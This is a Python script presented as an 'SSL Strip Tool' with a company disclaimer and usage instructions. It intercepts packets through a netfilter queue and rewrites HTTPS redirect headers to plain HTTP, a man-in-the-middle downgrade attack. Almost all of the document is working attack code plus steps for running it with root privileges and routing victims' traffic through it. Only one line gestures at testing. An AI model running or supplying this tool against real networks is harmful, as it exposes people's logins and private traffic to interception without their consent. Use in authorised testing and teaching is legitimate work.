"""
SSL Strip Tool
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script intercepts HTTPS connections and downgrades them to HTTP for testing purposes.

Instructions:
1. Run the script with superuser privileges.
2. Specify the port to listen for HTTP/HTTPS traffic.
3. Configure the network to route traffic through this script.

Required Libraries:
- scapy (Install with `pip install scapy`)
- netfilterqueue (Install with `pip install NetfilterQueue`)

Usage:
sudo python3 ssl_strip_tool.py
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def ssl_strip(packet):
    """
    Intercepts and downgrades HTTPS connections to HTTP.

    :param packet: The intercepted network packet.
    """
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw):
        payload = scapy_packet[Raw].load.decode("utf-8", errors="ignore")

        # Detect and modify HTTPS redirections
        if "Location: https://" in payload:
            modified_payload = payload.replace("https://", "http://")
            scapy_packet[Raw].load = modified_payload
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))
            print(f"Modified redirection to HTTP: {scapy_packet.summary()}")

    packet.accept()

if __name__ == "__main__":
    print("Welcome to the SSL Strip Tool.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")

    try:
        print("Setting up SSL stripping. Ensure iptables rules are configured to redirect traffic.")
        nfqueue = NetfilterQueue()
        nfqueue.bind(0, ssl_strip)
        print("SSL Strip Tool is running. Press Ctrl+C to stop.")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nStopping SSL Strip Tool.")
    except Exception as e:
        print(f"An error occurred: {e}")

